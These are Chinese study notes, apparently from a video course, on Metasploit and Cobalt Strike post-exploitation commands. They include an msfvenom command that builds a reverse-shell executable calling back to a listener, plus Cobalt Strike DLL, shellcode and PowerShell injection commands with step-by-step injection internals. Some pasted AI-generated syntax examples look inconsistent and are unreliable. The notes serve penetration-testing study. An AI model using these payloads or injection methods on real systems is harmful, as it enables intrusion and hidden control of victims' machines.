# [0x001 Metasploit-VS-CobaltStrike](https://www.bilibili.com/video/BV1ng411r7jr/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=1e325091774aa31c4dcd65d8667c69de)

## Metasploit

~~~ shell
? # 作用是罗列出可能用到的命令

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe -o ./viru.exe LHOST=192.168.1.11 LPORT=4444
# msfvenom 是Metasploit程序;
# -p windows/meterpreter/reverse_tcp 指会返回meterpreter的payload类型;
# -a x86 是架构类型x86;
# --platform windows 指的是windows平台;也可指的是Linux平台;
# --f 指的是文件类型exe类型;
# --o ./viru.exe 指输出到viru.exe;
# LHOST=192.168.1.11 LPORT=4444 指监听地址和监听端口;
# Metasploit 是命令行操作,不卡顿,而且Metasploit可以做漏洞扫描;Metasploit开源,命令和功能多;
~~~



## CobaltStrike

~~~ shell
? # 作用是罗列出可能用到的命令;
# 反弹beacon的payload类型;
# CobaltStrike 是UI操作,有可能卡顿,且CobaltStrike不能做漏洞扫描只能做一些生成木马和木马控制的操作;
~~~



# [0x002 CobaltStrike命令行](https://www.bilibili.com/video/BV1kW4y1b7WC/?spm_id_from=333.999.0.0&vd_source=1e325091774aa31c4dcd65d8667c69de)

## 命令行

~~~ shell
写命令行时可以先 ? 罗列出所有的命令;
然后输入 ？ 后加上想执行的命令;
然后再根据给出的命令提示帮助文档输入想执行的全部命令;
~~~

~~~ tex
出现不会的命令需要自己去研究;
~~~



+ upload 上传文件
+ ls 列出文件列表

~~~ shell
用法: upload [options] src1 src2 src3 ... destination
~~~



# [0x003 CobaltStrike_argue_进程参数欺骗](https://www.bilibili.com/video/BV1cB4y1z7FP/?spm_id_from=333.999.0.0&vd_source=1e325091774aa31c4dcd65d8667c69de)

| Command | Description                                                  |
| ------- | ------------------------------------------------------------ |
| argue   | Spoof arguments for matching processes(进程去进行些参数欺骗) |

![CS参数欺骗1](./CS/image/CS参数欺骗1.png)

ps：Metasploit可执行的则CobaltStrike一定可执行，反之CobaltStrike可执行的则Metasploit也可执行，两者是相通的；另外两者有些扩展功能可通过插件实现；



# [0x004 CobaltStrike_注入以及Hook](https://www.bilibili.com/video/BV15a41157Tr/?spm_id_from=333.999.0.0)

## 注入原理

![注入原理1](./CS/image/注入原理1.png)



## HOOK原理

![HOOK原理1](./CS/image/HOOK原理1.png)





## CobaltStrike之blockdlls命令



![CS注入及HOOK1](./CS/image/CS注入及HOOK1.png)



# [0x005 CS_inject](https://www.bilibili.com/video/BV16d4y1R7J9/?spm_id_from=333.880.my_history.page.click)

以下的命令包括了某些注入方式，且下图详解了几种命令的用法和简介，需注意的是要执行注入命令可能需要一定的权限

![CS inject1](./CS/image/CS inject1.PNG)



## dllinject命令

反射的方式注入dll文件

~~~ shell
usage：dllinject [pid] [/path/to/my.dll]

open the process and injects a Reflecive DLL
~~~



**用法(GPT回答)**

在Cobalt Strike中，`dllinject`命令用于将DLL文件注入到目标进程中以实现持久化。以下是使用`dllinject`命令的语法：

```tex
dllinject <PID> [/path/to/my.dll] [listener] [arch]
```

参数说明：

- `<PID>`：要注入DLL的目标进程ID。
- [/path/to/my.dll]：要注入的DLL文件。
- `[listener]`：可选参数，指定用于接收回连的监听器名称。
- `[arch]`：可选参数，指定目标主机的体系结构，如x86、x64等。

例如，要将DLL注入到进程ID为1234的目标主机中，可以执行以下命令：

```tex
dllinject 1234
```

如果你想使用特定的监听器进行回连，可以提供相应的参数。例如，将DLL注入到进程ID为1234的目标主机中，并使用名为`listener1`的监听器，可以执行以下命令：

```tex
dllinject 1234 listener1
```

请注意，在使用`dllinject`命令之前，你需要先设置好监听器并生成合适的DLL文件。确保DLL文件与目标主机的体系结构相匹配，并具有正确的功能和回连配置，以确保成功注入和执行。



**原理(GPT回答)**

`dllinject`命令的具体原理是将一个自定义的DLL文件注入到目标进程的地址空间中，并在目标进程中执行该DLL的代码。这种技术通常用于实现恶意软件的持久化、横向移动或特权提升等攻击行为。

下面是一般情况下DLL注入的基本步骤：

1. 加载目标进程：首先，通过系统API（如`OpenProcess`）打开目标进程，获取其句柄以便进行后续操作。
2. 分配内存空间：使用系统API（如`VirtualAllocEx`）在目标进程的地址空间中分配一块内存区域，用于存储即将被注入的DLL的内容。
3. 写入DLL数据：使用系统API（如`WriteProcessMemory`）将自定义的DLL文件的二进制数据写入到目标进程所分配的内存区域中。
4. 注入DLL：使用系统API（如`CreateRemoteThread`）在目标进程中创建一个远程线程，并指定该线程的起始地址为目标进程中加载DLL的函数入口点（如`LoadLibrary`）。这样，目标进程就会在其地址空间中加载并执行注入的DLL代码。
5. 清理资源：完成DLL注入后，关闭目标进程的句柄，释放相关的内存资源。

需要注意的是，具体的DLL注入实现可能会涉及更多细节和技术，例如注入方法选择（如`CreateRemoteThread`、`QueueUserAPC`等）、线程注入顺序的管理以及对抗防御机制等。不同的注入方法和技术也会在不同的操作系统版本和安全软件上产生不同的影响和绕过方式。因此，在使用DLL注入技术时，需要充分了解目标环境，并谨慎考虑相关风险和合规性问题。



## dllload命令

正常方式注入dll文件

~~~ shell
dllload <路径\到\dll文件>
~~~



示例

~~~ tex
dllload C:\path\to\your.dll
~~~

> `<路径\到\dll文件>` 是指向目标要加载的 DLL 文件的完整路径，需确保替换为实际的 DLL 文件路径。

执行相应的命令后，Cobalt Strike 将在目标系统上执行 DLL 注入操作，将 DLL 代码加载到目标进程中，这是正常的dll注入方法



## shinject命令

注入shellcode

~~~ shell
shinject [pid] <x86|x64> [/path/to/my.bin]
~~~



**用法(GPT回答)**

在Cobalt Strike中，`shinject`命令用于在目标主机上执行Shellcode注入。以下是使用`shinject`命令的语法：

```tex
shinject <PID> <x86|x64> [/path/to/my.bin] [listener] [arch] [method]
```

参数说明：

- `<PID>`：要注入Shellcode的目标进程ID。
- <x86|x64>：目标机的架构。
- [/path/to/my.bin]：要注入的shellcode文件
- `[listener]`：可选参数，指定用于接收回连的监听器名称。
- `[arch]`：可选参数，指定目标主机的体系结构，如x86、x64等。
- `[method]`：可选参数，指定注入的方法，如`CreateThread`、`QueueUserAPC`等。

例如，要将Shellcode注入到进程ID为1234的目标主机中，可以执行以下命令：

```tex
shinject 1234
```

如果你想使用特定的监听器和方法进行注入，可以提供相应的参数。例如，将Shellcode注入到进程ID为1234的目标主机中，并使用名为`listener1`的监听器以及`QueueUserAPC`方法，可以执行以下命令：

```tex
shinject 1234 listener1 x86 QueueUserAPC
```

请注意，在使用`shinject`命令之前，你需要先设置好监听器并生成合适的Shellcode。确保Shellcode与目标主机的体系结构相匹配，以确保成功注入和执行。



**原理(GPT回答)**

`shinject`是Cobalt Strike中的一个自定义命令，用于在目标主机上执行Shellcode注入。它的原理是将Shellcode作为字节序列加载到目标进程的地址空间，并在目标进程中创建线程来执行这段Shellcode。

下面是大致的`shinject`命令的原理和步骤：

1. 获取目标进程句柄：使用系统API（如`OpenProcess`）通过目标进程ID获取目标进程的句柄，以便进行后续的操作。
2. 在目标进程中分配内存：使用系统API（如`VirtualAllocEx`）在目标进程的地址空间中分配一块内存区域，用于存储Shellcode的字节序列。
3. 将Shellcode写入目标进程内存：使用系统API（如`WriteProcessMemory`）将Shellcode的字节序列写入到目标进程所分配的内存区域中。
4. 创建远程线程执行Shellcode：使用系统API（如`CreateRemoteThread`）在目标进程中创建一个远程线程，并将该线程的起始地址设置为Shellcode所在内存区域的首地址。这样，目标进程就会在其地址空间中执行Shellcode。
5. 清理资源：完成Shellcode注入后，关闭目标进程的句柄，释放相关的内存资源。

需要注意的是，具体的Shellcode注入实现通常会涉及更多细节和技术，例如注入方法的选择（如`CreateRemoteThread`、`QueueUserAPC`等）、权限管理、处理目标进程的线程上下文等。另外，Shellcode的编写和设计也需要考虑目标平台的体系结构、操作系统版本和安全软件的影响。



## psinject命令

注入powershell命令

~~~ shell
psinject [pid] [arch] [commandlet] [arguements]
~~~

+ pid：进程ID
+ arch：计算机架构，x86/x64
+ commandlet：要执行的powershell命令 
+ arguements：执行的powershell命令的参数



## inject命令

~~~ shell
inject [pid] <x86|x64> [listener]
~~~



**用法(GPT回答)**

在Cobalt Strike中，`inject`命令用于将Shellcode注入到目标主机的进程中。以下是使用`inject`命令的语法：

```shell
inject <PID> [listener] [arch] [method]
```

参数说明：

- `<PID>`：要注入Shellcode的目标进程ID。
- `[listener]`：可选参数，指定用于接收回连的监听器名称。
- `[arch]`：可选参数，指定目标主机的体系结构，如x86、x64等。
- `[method]`：可选参数，指定注入的方法，如`CreateRemoteThread`、`QueueUserAPC`等。

例如，要将Shellcode注入到进程ID为1234的目标主机中，可以执行以下命令：

```shell
inject 1234
```

如果你想使用特定的监听器和方法进行注入，可以提供相应的参数。例如，将Shellcode注入到进程ID为1234的目标主机中，并使用名为`listener1`的监听器以及`QueueUserAPC`方法，可以执行以下命令：

```shell
inject 1234 listener1 x86 QueueUserAPC
```

请注意，在使用`inject`命令之前，你需要先设置好监听器并生成合适的Shellcode。



**原理(GPT回答)**

`inject`命令是Cobalt Strike中的一个自定义命令，用于在目标进程中执行代码。它的原理是将自定义的二进制代码（例如Shellcode或者其他Payload）注入到目标进程的内存空间，并在目标进程中创建线程或使用其他方式来执行这段代码。

下面是一般情况下`inject`命令的基本原理和步骤：

1. 获取目标进程句柄：使用系统API（例如`OpenProcess`）通过目标进程ID获取目标进程的句柄，以便后续进行操作。
2. 在目标进程中分配内存：使用系统API（例如`VirtualAllocEx`）在目标进程的内存空间中分配一块内存区域，用于存储即将被注入的二进制代码。
3. 将二进制代码写入目标进程内存：使用系统API（例如`WriteProcessMemory`）将自定义的二进制代码写入到目标进程所分配的内存区域中。
4. 创建远程线程或其他执行方式：使用系统API（例如`CreateRemoteThread`）在目标进程中创建一个远程线程，并将该线程的起始地址指定为注入的代码在目标进程中的地址。这样，目标进程就会在其内存空间中执行注入的代码。
5. 清理资源：完成注入后，关闭目标进程的句柄，释放相关的内存资源。

需要注意的是，具体的`inject`命令实现可能会涉及更多细节和技术，例如注入方法选择（如`CreateRemoteThread`、`QueueUserAPC`等）、处理目标进程的线程上下文、权限管理等。另外，二进制代码的编写和设计也需要考虑目标平台的体系结构、操作系统版本和安全软件的影响。



**另：**

~~~ tex
进程句柄（Process Handle）是操作系统内部用来标识和管理一个进程的引用或访问权限。在操作系统层面，每个进程都被赋予一个唯一的标识符，即进程ID（Process ID，PID）。进程句柄则是通过这个标识符与特定进程建立联系，以便进行对该进程的操作。

进程句柄提供了一种机制，使得其他进程或系统组件可以与目标进程进行通信、资源共享和控制。通过使用进程句柄，可以访问和操作目标进程的内存、线程、文件、窗口等资源。例如，打开目标进程的句柄后，可以读取或修改其内存内容，创建或终止其中的线程，以及与其进行消息传递等操作。

需要注意的是，进程句柄是一种特权对象，只有具备足够权限的进程才能够获取和操作其他进程的句柄。通常情况下，操作系统会限制对句柄的访问权限，以确保系统的安全性和稳定性。因此，在使用进程句柄时，需要确保具备足够的权限，并按照操作系统提供的API进行正确的句柄管理和使用。

进程句柄在编程中经常被使用，例如在Windows平台的C/C++编程中，可以使用OpenProcess函数来根据进程ID获取进程句柄。而在Cobalt Strike等渗透测试工具中，也会通过相关的API或自定义命令获取目标进程的句柄，并用于执行各种操作和注入技术。
~~~



~~~ tex
注册表（Registry）是在Windows操作系统中用于存储和管理系统配置信息、应用程序设置以及其他系统和用户相关数据的一个层次化数据库。它是Windows操作系统的核心组成部分，用于存储关键的系统设置和配置项。

注册表以树状结构的形式组织数据，类似于文件系统中的文件夹和文件的层次结构。每个节点都被称为键（Key），而键下面可以包含子键和值（Value）。

注册表中的键和值存储着各种系统配置信息和应用程序设置，例如：

系统配置：存储了Windows操作系统的配置项，如网络设置、设备驱动、安全策略等。
用户配置：存储了与当前用户相关的配置项，如桌面背景、文件夹选项、用户偏好设置等。
应用程序配置：许多应用程序将其配置信息存储在注册表中，如Office套件、浏览器、数据库软件等。
通过修改注册表中的键和值，可以更改系统行为、配置应用程序选项以及进行系统优化等操作。然而，对注册表的修改需要小心谨慎，因为错误的更改可能会导致系统不稳定或功能受损。

在Windows操作系统中，可以使用regedit命令行工具或注册表编辑器（Registry Editor）进行注册表的浏览、查找和修改。注册表的根节点包括HKEY_CLASSES_ROOT、HKEY_CURRENT_USER、HKEY_LOCAL_MACHINE、HKEY_USERS和HKEY_CURRENT_CONFIG等。

总之，注册表是Windows操作系统中用于存储和管理配置信息的重要数据库，对于系统维护和应用程序管理具有重要意义。
~~~



# [0x006 CS_run](https://www.bilibili.com/video/BV1SV4y1p7Cf/?spm_id_from=333.880.my_history.page.click)

## run命令

用法如下：

![CS_run1](./CS/image/CS_run1.PNG)

在目标机执行某些程序如某些有回显的东西，如：<code>run tasklist</code>等



**用法(GPT)**

在Cobalt Strike中，`run`命令用于执行一条系统命令或者运行一个可执行程序（如二进制文件、脚本等）。

具体而言，`run`命令的作用是在目标主机上执行指定的命令或可执行程序，并将结果返回到Cobalt Strike控制台。以下是`run`命令的基本用法：

```tex
run <command>
```

其中 `<command>` 是要执行的系统命令或可执行程序的路径。

当你在Cobalt Strike控制台中输入`run`命令后，Cobalt Strike会将该命令发送到已经控制的目标主机，并在目标主机上执行相应的命令或可执行程序。执行完成后，Cobalt Strike会收集并显示命令执行的结果。

需要注意的是，`run`命令会直接在目标主机上执行命令或可执行程序，具有与目标主机相同的权限和环境。因此，在使用`run`命令时请小心，确保只执行合法和授权的操作，避免对目标主机造成不必要的风险或损害。

另外，Cobalt Strike还提供了其他命令来执行更丰富的操作，例如`execute-assembly`用于在目标主机上执行.NET程序集，`execute-script`用于在目标主机上执行脚本等。这些命令可以根据具体的需求选择使用。



**原理(GPT)**

在Cobalt Strike中，`run`命令的原理是通过与已经控制的目标主机建立的通信通道，在目标主机上执行指定的系统命令或可执行程序。

下面是`run`命令的大致原理和步骤：

1. Cobalt Strike控制台与已经控制的目标主机之间建立通信通道。这个通道可以通过多种技术来实现，例如反向TCP连接、HTTP流量、DNS隧道等。
2. 在Cobalt Strike控制台中输入`run`命令，并指定要在目标主机上执行的系统命令或可执行程序的路径。
3. 控制台将`run`命令发送到目标主机，并通过通信通道将命令传递给目标主机的代理进程（Beacon）。
4. 目标主机上的代理进程接收到命令后，使用操作系统提供的API（如`CreateProcess`）在目标主机上创建一个新的进程，并指定要运行的系统命令或可执行程序。
5. 在目标主机上执行命令或可执行程序，并将结果返回给代理进程。
6. 代理进程将命令执行的结果传递回Cobalt Strike控制台，控制台将其显示给操作人员。

需要注意的是，具体的`run`命令实现可能会涉及更多细节和技术，以满足不同环境和要求。Cobalt Strike的代理进程（Beacon）作为与目标主机之间的中间人，起到了传输命令和结果的桥梁作用。

此外，Cobalt Strike还提供了其他命令和功能，如`ps`, `shell`等，用于在目标主机上执行不同类型的操作和命令。这些命令的原理也是通过与目标主机之间的通信通道进行交互和控制。



## **runu命令**

用法如下：

![CS run2](./CS/image/CS run2.PNG)

让某个进程作为父进程

